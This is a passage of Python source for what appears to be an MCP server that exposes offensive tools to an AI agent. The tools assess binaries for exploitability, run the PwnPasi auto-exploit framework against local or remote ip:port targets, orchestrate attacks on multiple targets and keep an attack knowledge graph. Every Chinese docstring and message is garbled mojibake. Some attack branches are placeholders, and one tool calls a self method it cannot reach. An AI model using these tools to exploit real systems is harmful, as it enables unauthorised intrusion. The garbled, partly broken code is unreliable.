        å¿«é€ŸPWNæ¼æ´æ£€æŸ¥ - å¿«é€Ÿè¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶çš„PWNæ”»å‡»å¯èƒ½æ€§

        æ‰§è¡Œå¿«é€Ÿåˆ†ææ¥åˆ¤æ–­äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¦å®¹æ˜“å—åˆ°PWNæ”»å‡»ï¼š
        - äºŒè¿›åˆ¶ä¿æŠ¤åˆ†æ (RELRO, Canary, NX, PIE)
        - å±é™©å‡½æ•°æ£€æµ‹ (gets, strcpy, sprintfç­‰)
        - æ ˆæº¢å‡ºå¯èƒ½æ€§åˆ†æ
        - åˆ©ç”¨éš¾åº¦è¯„ä¼°

        Args:
            binary_path: è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„

        Returns:
            å¿«é€ŸPWNåˆ†æç»“æœï¼ŒåŒ…å«æ”»å‡»å¯èƒ½æ€§è¯„ä¼°å’Œå»ºè®®çš„æ”»å‡»æ–¹æ³•
        """
        import subprocess

        results = {
            "binary_path": binary_path,
            "analysis_timestamp": datetime.datetime.now().isoformat(),
            "protections": {},
            "vulnerable_functions": [],
            "attack_surface": [],
            "difficulty_assessment": "unknown",
            "recommended_methods": [],
            "quick_attack_possible": False
        }

        try:
            if not os.path.exists(binary_path):
                results["error"] = f"Binary file not found: {binary_path}"
                return results

            # 1. æ£€æŸ¥äºŒè¿›åˆ¶ä¿æŠ¤
            try:
                checksec_cmd = ["checksec", "--file", binary_path]
                checksec_result = subprocess.run(checksec_cmd, capture_output=True, text=True, timeout=30)
                if checksec_result.returncode == 0:
                    output = checksec_result.stdout
                    results["protections"]["raw_output"] = output

                    # è§£æä¿æŠ¤çŠ¶æ€
                    protections_status = {
                        "relro": "No RELRO" in output or "Partial RELRO" in output,
                        "canary": "No canary found" in output,
                        "nx": "NX disabled" in output,
                        "pie": "No PIE" in output
                    }
                    results["protections"]["status"] = protections_status

                    # è¯„ä¼°æ”»å‡»éš¾åº¦
                    disabled_protections = sum(1 for disabled in protections_status.values() if disabled)
                    if disabled_protections >= 3:
                        results["difficulty_assessment"] = "easy"
                        results["quick_attack_possible"] = True
                    elif disabled_protections >= 2:
                        results["difficulty_assessment"] = "medium"
                    else:
                        results["difficulty_assessment"] = "hard"

            except subprocess.TimeoutExpired:
                results["protections"]["error"] = "checksec timeout"
            except FileNotFoundError:
                results["protections"]["error"] = "checksec not found"

            # 2. æ£€æŸ¥å±é™©å‡½æ•°
            try:
                strings_cmd = ["strings", binary_path]
                strings_result = subprocess.run(strings_cmd, capture_output=True, text=True, timeout=30)

                dangerous_functions = [
                    "gets", "strcpy", "strcat", "sprintf", "vsprintf",
                    "scanf", "fscanf", "sscanf", "strncpy", "strncat"
                ]

                if strings_result.returncode == 0:
                    output = strings_result.stdout
                    for func in dangerous_functions:
                        if func in output:
                            results["vulnerable_functions"].append(func)

            except subprocess.TimeoutExpired:
                results["vulnerable_functions_error"] = "strings timeout"
            except FileNotFoundError:
                results["vulnerable_functions_error"] = "strings not found"

            # 3. ç”Ÿæˆæ”»å‡»å»ºè®®
            if results["quick_attack_possible"]:
                results["recommended_methods"] = ["pwnpasi_auto", "ret2system", "ret2libc"]
                results["attack_surface"] = ["stack_overflow", "format_string"]
            elif results["difficulty_assessment"] == "medium":
                results["recommended_methods"] = ["pwnpasi_auto", "rop_chain"]
                results["attack_surface"] = ["stack_overflow"]
            else:
                results["recommended_methods"] = ["advanced_rop", "heap_exploitation"]
                results["attack_surface"] = ["complex_exploitation"]

            results["success"] = True
            results["summary"] = {
                "attack_possible": results["quick_attack_possible"],
                "difficulty": results["difficulty_assessment"],
                "vulnerable_functions_count": len(results["vulnerable_functions"]),
                "recommended_tool": "pwnpasi" if results["quick_attack_possible"] else "manual_exploitation"
            }

            return results

        except Exception as e:
            logger.error(f"Quick PWN check error: {str(e)}")
            results["success"] = False
            results["error"] = str(e)
            return results

    @mcp.tool()
    def pwnpasi_auto_pwn(binary_path: str, remote_ip: str = "", remote_port: int = 0,
                        libc_path: str = "", padding: int = 0, verbose: bool = False,
                        additional_args: str = "") -> Dict[str, Any]:
        """
        æ‰§è¡ŒPwnPasiè‡ªåŠ¨åŒ–äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨

        PwnPasiæ˜¯ä¸€ä¸ªä¸“ä¸šçš„è‡ªåŠ¨åŒ–äºŒè¿›åˆ¶åˆ©ç”¨æ¡†æ¶ï¼Œæ”¯æŒå¤šç§åˆ©ç”¨æŠ€æœ¯ï¼š
        - è‡ªåŠ¨æ ˆæº¢å‡ºæ£€æµ‹å’Œåˆ©ç”¨
        - ret2system, ret2libc, ROPé“¾æ„é€ 
        - äºŒè¿›åˆ¶ä¿æŠ¤ç»•è¿‡ (RELRO, Canary, NX, PIE)
        - æœ¬åœ°å’Œè¿œç¨‹åˆ©ç”¨æ¨¡å¼
        - æ™ºèƒ½å¡«å……è®¡ç®—å’Œlibcç‰ˆæœ¬æ£€æµ‹

        Args:
            binary_path: ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ (å¿…éœ€)
            remote_ip: è¿œç¨‹ç›®æ ‡IPåœ°å€ (å¯é€‰ï¼Œç”¨äºè¿œç¨‹åˆ©ç”¨)
            remote_port: è¿œç¨‹ç›®æ ‡ç«¯å£ (å¯é€‰ï¼Œä¸remote_ipé…åˆä½¿ç”¨)
            libc_path: è‡ªå®šä¹‰libcåº“è·¯å¾„ (å¯é€‰)
            padding: æ‰‹åŠ¨æŒ‡å®šæº¢å‡ºå¡«å……å¤§å° (å¯é€‰)
            verbose: å¯ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼
            additional_args: é¢å¤–çš„pwnpasiå‚æ•°

        Returns:
            PwnPasiåˆ©ç”¨ç»“æœï¼ŒåŒ…å«åˆ©ç”¨è¿‡ç¨‹ã€å‘ç°çš„æ¼æ´å’Œè·å–çš„Shellä¿¡æ¯
        """
        data = {
            "binary_path": binary_path,
            "remote_ip": remote_ip,
            "remote_port": remote_port,
            "libc_path": libc_path,
            "padding": padding,
            "verbose": verbose,
            "additional_args": additional_args
        }
        return executor.execute_tool_with_data("pwnpasi", data)

    @mcp.tool()
    def pwn_comprehensive_attack(binary_path: str, attack_methods: List[str] = None,
                               remote_target: str = "", timeout: int = 300) -> Dict[str, Any]:
        """
        ç»¼åˆPWNæ”»å‡» - ä½¿ç”¨å¤šç§æ–¹æ³•å°è¯•åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶

        ç»“åˆå¤šç§PWNæ”»å‡»æŠ€æœ¯ï¼ŒåŒ…æ‹¬PwnPasiè‡ªåŠ¨åŒ–åˆ©ç”¨å’Œå…¶ä»–æ‰‹åŠ¨æŠ€æœ¯ï¼š
        - pwnpasi_auto: ä½¿ç”¨PwnPasiè‡ªåŠ¨åŒ–åˆ©ç”¨
        - ret2libc: ret2libcæ”»å‡»é“¾
        - rop_chain: ROPé“¾æ„é€ æ”»å‡»
        - shellcode_injection: ç›´æ¥shellcodeæ³¨å…¥
        - format_string: æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»

        Args:
            binary_path: ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„
            attack_methods: è¦å°è¯•çš„æ”»å‡»æ–¹æ³•åˆ—è¡¨ (é»˜è®¤: ["pwnpasi_auto", "ret2libc"])
            remote_target: è¿œç¨‹ç›®æ ‡åœ°å€ (æ ¼å¼: ip:port)
            timeout: å•ä¸ªæ”»å‡»æ–¹æ³•çš„è¶…æ—¶æ—¶é—´ (ç§’)

        Returns:
            ç»¼åˆæ”»å‡»ç»“æœï¼ŒåŒ…å«æ¯ç§æ–¹æ³•çš„æ‰§è¡Œç»“æœå’ŒæˆåŠŸçš„åˆ©ç”¨æ–¹å¼
        """
        if attack_methods is None:
            attack_methods = ["pwnpasi_auto", "ret2libc"]

        results = {
            "binary_path": binary_path,
            "attack_methods": attack_methods,
            "remote_target": remote_target,
            "timestamp": datetime.datetime.now().isoformat(),
            "attempts": [],
            "successful_methods": [],
            "failed_methods": [],
            "overall_success": False
        }

        # è§£æè¿œç¨‹ç›®æ ‡
        remote_ip, remote_port = "", 0
        if remote_target and ":" in remote_target:
            try:
                remote_ip, port_str = remote_target.split(":", 1)
                remote_port = int(port_str)
            except ValueError:
                results["error"] = f"Invalid remote target format: {remote_target}. Use ip:port format."
                return results

        for method in attack_methods:
            attempt = {
                "method": method,
                "start_time": datetime.datetime.now().isoformat(),
                "success": False,
                "output": "",
                "error": ""
            }

            try:
                if method == "pwnpasi_auto":
                    # ä½¿ç”¨PwnPasiè‡ªåŠ¨åŒ–åˆ©ç”¨
                    result = pwnpasi_auto_pwn(
                        binary_path=binary_path,
                        remote_ip=remote_ip,
                        remote_port=remote_port,
                        verbose=True
                    )
                    attempt["output"] = result.get("output", "")
                    attempt["success"] = result.get("success", False)
                    if not attempt["success"] and "error" in result:
                        attempt["error"] = result["error"]

                elif method == "ret2libc":
                    # è¿™é‡Œå¯ä»¥é›†æˆå…¶ä»–ret2libcå·¥å…·æˆ–è„šæœ¬
                    attempt["output"] = "ret2libc attack method placeholder - implement specific ret2libc logic"
                    attempt["success"] = False
                    attempt["error"] = "ret2libc method not yet implemented"

                elif method == "rop_chain":
                    # è¿™é‡Œå¯ä»¥é›†æˆROPé“¾æ„é€ å·¥å…·
                    attempt["output"] = "ROP chain attack method placeholder - implement specific ROP logic"
                    attempt["success"] = False
                    attempt["error"] = "ROP chain method not yet implemented"

                else:
                    attempt["error"] = f"Unknown attack method: {method}"

                if attempt["success"]:
                    results["successful_methods"].append(method)
                    results["overall_success"] = True
                else:
                    results["failed_methods"].append(method)

            except Exception as e:
                attempt["error"] = str(e)
                results["failed_methods"].append(method)

            attempt["end_time"] = datetime.datetime.now().isoformat()
            results["attempts"].append(attempt)

            # å¦‚æœæˆåŠŸäº†ï¼Œå¯ä»¥é€‰æ‹©ç»§ç»­å°è¯•å…¶ä»–æ–¹æ³•æˆ–åœæ­¢
            if attempt["success"] and len(results["successful_methods"]) >= 1:
                results["note"] = "Stopped after first successful exploit"
                break

        return results

    @mcp.tool()
    def multi_target_add_target(target_url: str, target_type: str = "unknown",
                               priority: int = 1, dependencies: str = "") -> Dict[str, Any]:
        """
        æ·»åŠ æ–°ç›®æ ‡åˆ°å¤šç›®æ ‡åè°ƒç³»ç»Ÿ

        Args:
            target_url: ç›®æ ‡URLæˆ–IPåœ°å€
            target_type: ç›®æ ‡ç±»å‹ (web, network, mobile, cloud)
            priority: ä¼˜å…ˆçº§ (1-10, 10ä¸ºæœ€é«˜)
            dependencies: ä¾èµ–çš„å…¶ä»–ç›®æ ‡IDï¼Œé€—å·åˆ†éš”

        Returns:
            åŒ…å«ç›®æ ‡IDå’ŒçŠ¶æ€çš„å­—å…¸
        """
        try:
            dep_list = [dep.strip() for dep in dependencies.split(",")] if dependencies else []
            target_id = multi_target_orchestrator.add_target(
                target_url=target_url,
                target_type=target_type,
                priority=priority,
                dependencies=dep_list
            )

            return {
                "success": True,
                "target_id": target_id,
                "target_url": target_url,
                "target_type": target_type,
                "priority": priority,
                "dependencies": dep_list,
                "message": f"ç›®æ ‡ {target_url} å·²æ·»åŠ åˆ°åè°ƒç³»ç»Ÿ"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ·»åŠ ç›®æ ‡å¤±è´¥"
            }

    @mcp.tool()
    def multi_target_orchestrate(strategy: str = "adaptive") -> Dict[str, Any]:
        """
        æ‰§è¡Œå¤šç›®æ ‡æ”»å‡»ç¼–æ’

        Args:
            strategy: ç¼–æ’ç­–ç•¥ (sequential, parallel, adaptive, dependency_aware)

        Returns:
            åŒ…å«æ‰§è¡Œè®¡åˆ’çš„è¯¦ç»†ä¿¡æ¯
        """
        try:
            orchestration_result = multi_target_orchestrator.orchestrate_attack(strategy)

            return {
                "success": True,
                "orchestration_plan": orchestration_result,
                "message": f"ä½¿ç”¨ {strategy} ç­–ç•¥ç”Ÿæˆæ‰§è¡Œè®¡åˆ’"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "ç¼–æ’æ‰§è¡Œå¤±è´¥"
            }

    @mcp.tool()
    def multi_target_get_status() -> Dict[str, Any]:
        """
        è·å–å¤šç›®æ ‡åè°ƒç³»ç»ŸçŠ¶æ€

        Returns:
            åŒ…å«ç³»ç»ŸçŠ¶æ€çš„è¯¦ç»†ä¿¡æ¯
        """
        try:
            status = multi_target_orchestrator.get_orchestration_status()

            return {
                "success": True,
                "status": status,
                "message": "ç³»ç»ŸçŠ¶æ€è·å–æˆåŠŸ"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è·å–çŠ¶æ€å¤±è´¥"
            }

    @mcp.tool()
    def multi_target_execute_batch(target_ids: str = "", max_concurrent: int = 3) -> Dict[str, Any]:
        """
        æ‰¹é‡æ‰§è¡Œå¤šç›®æ ‡æ”»å‡»ä»»åŠ¡

        Args:
            target_ids: ç›®æ ‡IDåˆ—è¡¨ï¼Œé€—å·åˆ†éš”ï¼ˆç©ºåˆ™æ‰§è¡Œæ‰€æœ‰ï¼‰
            max_concurrent: æœ€å¤§å¹¶å‘ä»»åŠ¡æ•°

        Returns:
            æ‰¹é‡æ‰§è¡Œç»“æœ
        """
        try:
            # è§£æç›®æ ‡IDåˆ—è¡¨
            if target_ids:
                target_list = [tid.strip() for tid in target_ids.split(",")]
            else:
                target_list = list(multi_target_orchestrator.targets.keys())

            # æ›´æ–°å¹¶å‘é™åˆ¶
            multi_target_orchestrator.max_concurrent_tasks = max_concurrent

            # æ‰§è¡Œç¼–æ’
            orchestration_result = multi_target_orchestrator.orchestrate_attack("adaptive")

            # æ¨¡æ‹Ÿæ‰¹é‡æ‰§è¡Œ
            execution_summary = {
                "total_targets": len(target_list),
                "execution_strategy": orchestration_result["orchestration_strategy"],
                "estimated_time": orchestration_result["estimated_total_time"],
                "phases": len(orchestration_result["execution_plan"].get("execution_phases", [])),
                "concurrent_limit": max_concurrent
            }

            return {
                "success": True,
                "execution_summary": execution_summary,
                "orchestration_plan": orchestration_result,
                "message": f"æ‰¹é‡æ‰§è¡Œå·²å¯åŠ¨ï¼Œæ¶‰åŠ {len(target_list)} ä¸ªç›®æ ‡"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ‰¹é‡æ‰§è¡Œå¤±è´¥"
            }

    # ==================== é«˜çº§ä¸Šä¸‹æ–‡å…³è”å’Œæ¨¡å¼è¯†åˆ«å·¥å…· ====================

    @mcp.tool()
    def analyze_context_patterns(session_history: str, current_context: str = "{}") -> Dict[str, Any]:
        """
        åˆ†æä¸Šä¸‹æ–‡æ¨¡å¼å’Œå…³è”ï¼Œå‘ç°è¡Œä¸ºæ¨¡å¼å¹¶ç”Ÿæˆé¢„æµ‹å»ºè®®

        Args:
            session_history: ä¼šè¯å†å²ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            current_context: å½“å‰ä¸Šä¸‹æ–‡ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«æ¨¡å¼åˆ†æç»“æœçš„å­—å…¸
        """
        try:
            import json

            # è§£æè¾“å…¥å‚æ•°
            try:
                history_data = json.loads(session_history) if session_history else []
                context_data = json.loads(current_context) if current_context else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼æ•°æ®"
                }

            # æ‰§è¡Œä¸Šä¸‹æ–‡æ¨¡å¼åˆ†æ
            analysis_results = advanced_context_analyzer.analyze_context_patterns(
                session_history=history_data,
                current_context=context_data
            )

            return {
                "success": True,
                "analysis_results": analysis_results,
                "message": "ä¸Šä¸‹æ–‡æ¨¡å¼åˆ†æå®Œæˆ"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "ä¸Šä¸‹æ–‡æ¨¡å¼åˆ†æå¤±è´¥"
            }

    @mcp.tool()
    def get_pattern_repository() -> Dict[str, Any]:
        """
        è·å–å·²å‘ç°çš„æ¨¡å¼åº“ä¿¡æ¯

        Returns:
            åŒ…å«æ¨¡å¼åº“ç»Ÿè®¡ä¿¡æ¯çš„å­—å…¸
        """
        try:
            patterns_info = []

            for pattern_name, pattern in advanced_context_analyzer.pattern_repository.items():
                patterns_info.append({
                    "pattern_id": pattern.pattern_id,
                    "pattern_name": pattern.pattern_name,
                    "pattern_type": pattern.pattern_type,
                    "occurrence_count": pattern.occurrence_count,
                    "success_rate": pattern.success_rate,
                    "confidence_score": pattern.confidence_score,
                    "associated_strategies": pattern.associated_strategies,
                    "last_seen": pattern.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
                    "pattern_signature": pattern.pattern_signature
                })

            return {
                "success": True,
                "patterns": patterns_info,
                "total_patterns": len(patterns_info),
                "repository_stats": {
                    "total_patterns": len(patterns_info),
                    "high_confidence_patterns": len([p for p in patterns_info if p["confidence_score"] > 0.7]),
                    "pattern_types": list(set(p["pattern_type"] for p in patterns_info))
                },
                "message": f"æ¨¡å¼åº“åŒ…å« {len(patterns_info)} ä¸ªå·²è¯†åˆ«æ¨¡å¼"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "è·å–æ¨¡å¼åº“ä¿¡æ¯å¤±è´¥"
            }

    @mcp.tool()
    def predict_next_action(current_context: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        åŸºäºä¸Šä¸‹æ–‡æ¨¡å¼é¢„æµ‹ä¸‹ä¸€æ­¥æœ€ä½³è¡ŒåŠ¨

        Args:
            current_context: å½“å‰ä¸Šä¸‹æ–‡ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            session_history: ä¼šè¯å†å²ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«é¢„æµ‹å»ºè®®çš„å­—å…¸
        """
        try:
            import json

            # è§£æè¾“å…¥å‚æ•°
            try:
                context_data = json.loads(current_context) if current_context else {}
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼æ•°æ®"
                }

            # åˆ†æä¸Šä¸‹æ–‡æ¨¡å¼
            analysis_results = advanced_context_analyzer.analyze_context_patterns(
                session_history=history_data,
                current_context=context_data
            )

            # æå–é¢„æµ‹å»ºè®®
            recommendations = analysis_results.get("predictive_recommendations", [])

            # æ ¹æ®ç½®ä¿¡åº¦æ’åºå»ºè®®
            recommendations.sort(key=lambda x: x.get("confidence", 0), reverse=True)

            # é€‰æ‹©æœ€ä½³å»ºè®®
            best_recommendation = recommendations[0] if recommendations else {
                "type": "default",
                "suggestion": "å»ºè®®æ‰§è¡ŒåŸºç¡€æ‰«æä»¥æ”¶é›†æ›´å¤šä¿¡æ¯",
                "confidence": 0.5,
                "reasoning": "ç¼ºä¹è¶³å¤Ÿçš„å†å²æ•°æ®è¿›è¡Œç²¾ç¡®é¢„æµ‹"
            }

            return {
                "success": True,
                "predicted_action": best_recommendation,
                "all_recommendations": recommendations,
                "context_analysis": {
                    "patterns_found": len(analysis_results.get("discovered_patterns", [])),
                    "correlations_found": len(analysis_results.get("strong_correlations", [])),
                    "confidence_level": best_recommendation.get("confidence", 0)
                },
                "message": f"åŸºäºä¸Šä¸‹æ–‡åˆ†æï¼Œæ¨èæ‰§è¡Œ: {best_recommendation.get('suggestion', 'æœªçŸ¥')}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "é¢„æµ‹åˆ†æå¤±è´¥"
            }

    @mcp.tool()
    def analyze_tool_effectiveness(tool_name: str, session_history: str = "[]") -> Dict[str, Any]:
        """
        åˆ†æç‰¹å®šå·¥å…·åœ¨ä¸åŒä¸Šä¸‹æ–‡ä¸­çš„æ•ˆæœ

        Args:
            tool_name: å·¥å…·åç§°
            session_history: ä¼šè¯å†å²ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«å·¥å…·æ•ˆæœåˆ†æçš„å­—å…¸
        """
        try:
            import json

            # è§£æä¼šè¯å†å²
            try:
                history_data = json.loads(session_history) if session_history else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼ä¼šè¯å†å²"
                }

            # åˆ†æå·¥å…·ä½¿ç”¨æƒ…å†µ
            tool_usage_stats = {
                "total_usage": 0,
                "success_count": 0,
                "failure_count": 0,
                "success_rate": 0.0,
                "usage_contexts": [],
                "effectiveness_by_context": {}
            }

            for entry in history_data:
                tools_used = entry.get("tools_used", [])
                outcome = entry.get("outcome", "unknown")
                context_type = entry.get("target_type", "unknown")

                if tool_name in tools_used:
                    tool_usage_stats["total_usage"] += 1

                    context_info = {
                        "context_type": context_type,
                        "outcome": outcome,
                        "timestamp": entry.get("timestamp", "unknown")
                    }
                    tool_usage_stats["usage_contexts"].append(context_info)

                    if outcome == "success":
                        tool_usage_stats["success_count"] += 1
                    elif outcome == "failure":
                        tool_usage_stats["failure_count"] += 1

                    # æŒ‰ä¸Šä¸‹æ–‡ç±»å‹ç»Ÿè®¡
                    if context_type not in tool_usage_stats["effectiveness_by_context"]:
                        tool_usage_stats["effectiveness_by_context"][context_type] = {
                            "usage": 0, "success": 0, "failure": 0
                        }

                    tool_usage_stats["effectiveness_by_context"][context_type]["usage"] += 1
                    if outcome == "success":
                        tool_usage_stats["effectiveness_by_context"][context_type]["success"] += 1
                    elif outcome == "failure":
                        tool_usage_stats["effectiveness_by_context"][context_type]["failure"] += 1

            # è®¡ç®—æˆåŠŸç‡
            if tool_usage_stats["total_usage"] > 0:
                tool_usage_stats["success_rate"] = (
                    tool_usage_stats["success_count"] / tool_usage_stats["total_usage"]
                )

            # è®¡ç®—å„ä¸Šä¸‹æ–‡ä¸­çš„æˆåŠŸç‡
            for context_type, stats in tool_usage_stats["effectiveness_by_context"].items():
                if stats["usage"] > 0:
                    stats["success_rate"] = stats["success"] / stats["usage"]

            return {
                "success": True,
                "tool_name": tool_name,
                "effectiveness_analysis": tool_usage_stats,
                "recommendations": self._generate_tool_recommendations(tool_name, tool_usage_stats),
                "message": f"å·¥å…· {tool_name} æ•ˆæœåˆ†æå®Œæˆ"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "å·¥å…·æ•ˆæœåˆ†æå¤±è´¥"
            }

    def _generate_tool_recommendations(self, tool_name: str, stats: Dict[str, Any]) -> List[str]:
        """ç”Ÿæˆå·¥å…·ä½¿ç”¨å»ºè®®"""
        recommendations = []

        if stats["total_usage"] == 0:
            recommendations.append(f"å·¥å…· {tool_name} å°šæœªä½¿ç”¨ï¼Œå»ºè®®åœ¨é€‚å½“åœºæ™¯ä¸‹å°è¯•")
        elif stats["success_rate"] > 0.8:
            recommendations.append(f"å·¥å…· {tool_name} è¡¨ç°ä¼˜ç§€ï¼ŒæˆåŠŸç‡ {stats['success_rate']:.1%}ï¼Œæ¨èç»§ç»­ä½¿ç”¨")
        elif stats["success_rate"] < 0.3:
            recommendations.append(f"å·¥å…· {tool_name} æˆåŠŸç‡è¾ƒä½ ({stats['success_rate']:.1%})ï¼Œå»ºè®®æ£€æŸ¥ä½¿ç”¨æ–¹æ³•æˆ–æ›´æ¢å·¥å…·")
        else:
            recommendations.append(f"å·¥å…· {tool_name} è¡¨ç°ä¸­ç­‰ï¼ŒæˆåŠŸç‡ {stats['success_rate']:.1%}")

        # åŸºäºä¸Šä¸‹æ–‡çš„å»ºè®®
        best_contexts = []
        worst_contexts = []

        for context, context_stats in stats["effectiveness_by_context"].items():
            if context_stats.get("success_rate", 0) > 0.8:
                best_contexts.append(context)
            elif context_stats.get("success_rate", 0) < 0.3:
                worst_contexts.append(context)

        if best_contexts:
            recommendations.append(f"åœ¨ {', '.join(best_contexts)} ç±»å‹ç›®æ ‡ä¸­è¡¨ç°æœ€ä½³")

        if worst_contexts:
            recommendations.append(f"åœ¨ {', '.join(worst_contexts)} ç±»å‹ç›®æ ‡ä¸­æ•ˆæœè¾ƒå·®ï¼Œå»ºè®®é¿å…ä½¿ç”¨")

        return recommendations

    # ==================== æ”»å‡»æ™ºèƒ½çŸ¥è¯†å›¾è°±å·¥å…· ====================

    @mcp.tool()
    def knowledge_graph_query_nodes(node_type: str = "", name_pattern: str = "",
                                   min_confidence: float = 0.0) -> Dict[str, Any]:
        """
        æŸ¥è¯¢çŸ¥è¯†å›¾è°±ä¸­çš„èŠ‚ç‚¹

        Args:
            node_type: èŠ‚ç‚¹ç±»å‹ (target, tool, vulnerability, technique, strategy)
            name_pattern: åç§°æ¨¡å¼åŒ¹é…
            min_confidence: æœ€å°ç½®ä¿¡åº¦é˜ˆå€¼

        Returns:
            åŒ…å«æŸ¥è¯¢ç»“æœçš„å­—å…¸
        """
        try:
            nodes = attack_knowledge_graph.query_nodes(
                node_type=node_type if node_type else None,
                name_pattern=name_pattern if name_pattern else None,
                min_confidence=min_confidence
            )

            return {
                "success": True,
                "nodes": nodes,
                "total_count": len(nodes),
                "query_params": {
                    "node_type": node_type,
                    "name_pattern": name_pattern,
                    "min_confidence": min_confidence
                },
                "message": f"æŸ¥è¯¢åˆ° {len(nodes)} ä¸ªåŒ¹é…çš„çŸ¥è¯†èŠ‚ç‚¹"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "çŸ¥è¯†å›¾è°±èŠ‚ç‚¹æŸ¥è¯¢å¤±è´¥"
            }

    @mcp.tool()
    def knowledge_graph_recommend_tools(target_properties: str) -> Dict[str, Any]:
        """
        æ ¹æ®ç›®æ ‡ç‰¹å¾æ¨èæœ€ä½³å·¥å…·

        Args:
            target_properties: ç›®æ ‡å±æ€§ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«å·¥å…·æ¨èçš„å­—å…¸
        """
        try:
            import json

            # è§£æç›®æ ‡å±æ€§
            try:
                target_props = json.loads(target_properties) if target_properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼ç›®æ ‡å±æ€§"
                }

            recommendations = attack_knowledge_graph.recommend_tools_for_target(target_props)

            return {
                "success": True,
                "recommendations": recommendations,
                "total_count": len(recommendations),
                "target_properties": target_props,
                "message": f"æ ¹æ®ç›®æ ‡ç‰¹å¾æ¨èäº† {len(recommendations)} ä¸ªå·¥å…·"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "å·¥å…·æ¨èå¤±è´¥"
            }

    @mcp.tool()
    def knowledge_graph_add_node(node_type: str, node_name: str, properties: str = "{}",
                                confidence: float = 0.5, tags: str = "") -> Dict[str, Any]:
        """
        å‘çŸ¥è¯†å›¾è°±æ·»åŠ æ–°èŠ‚ç‚¹

        Args:
            node_type: èŠ‚ç‚¹ç±»å‹
            node_name: èŠ‚ç‚¹åç§°
            properties: èŠ‚ç‚¹å±æ€§ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²
            confidence: ç½®ä¿¡åº¦ (0.0-1.0)
            tags: æ ‡ç­¾ï¼Œé€—å·åˆ†éš”

        Returns:
            åŒ…å«æ·»åŠ ç»“æœçš„å­—å…¸
        """
        try:
            import json

            # è§£æå±æ€§
            try:
                props = json.loads(properties) if properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼å±æ€§"
                }

            # è§£ææ ‡ç­¾
            tag_list = [tag.strip() for tag in tags.split(",")] if tags else []

            node_id = attack_knowledge_graph.add_node(
                node_type=node_type,
                node_name=node_name,
                properties=props,
                confidence=confidence,
                tags=tag_list
            )

            return {
                "success": True,
                "node_id": node_id,
                "node_type": node_type,
                "node_name": node_name,
                "properties": props,
                "confidence": confidence,
                "tags": tag_list,
                "message": f"æˆåŠŸæ·»åŠ çŸ¥è¯†èŠ‚ç‚¹: {node_name}"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "æ·»åŠ çŸ¥è¯†èŠ‚ç‚¹å¤±è´¥"
            }

    @mcp.tool()
    def knowledge_graph_add_relation(source_node_id: str, target_node_id: str,
                                   relation_type: str, strength: float = 0.5,
                                   properties: str = "{}") -> Dict[str, Any]:
        """
        åœ¨çŸ¥è¯†å›¾è°±ä¸­æ·»åŠ èŠ‚ç‚¹å…³ç³»

        Args:
            source_node_id: æºèŠ‚ç‚¹ID
            target_node_id: ç›®æ ‡èŠ‚ç‚¹ID
            relation_type: å…³ç³»ç±»å‹
            strength: å…³ç³»å¼ºåº¦ (0.0-1.0)
            properties: å…³ç³»å±æ€§ï¼ŒJSONæ ¼å¼å­—ç¬¦ä¸²

        Returns:
            åŒ…å«æ·»åŠ ç»“æœçš„å­—å…¸
        """
        try:
            import json

            # è§£æå±æ€§
            try:
                props = json.loads(properties) if properties else {}
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSONè§£æé”™è¯¯: {str(e)}",
                    "message": "è¯·æä¾›æœ‰æ•ˆçš„JSONæ ¼å¼å…³ç³»å±æ€§"
                }

            relation_id = attack_knowledge_graph.add_relation(
                source_node_id=source_node_id,
                target_node_id=target_node_id,
                relation_type=relation_type,
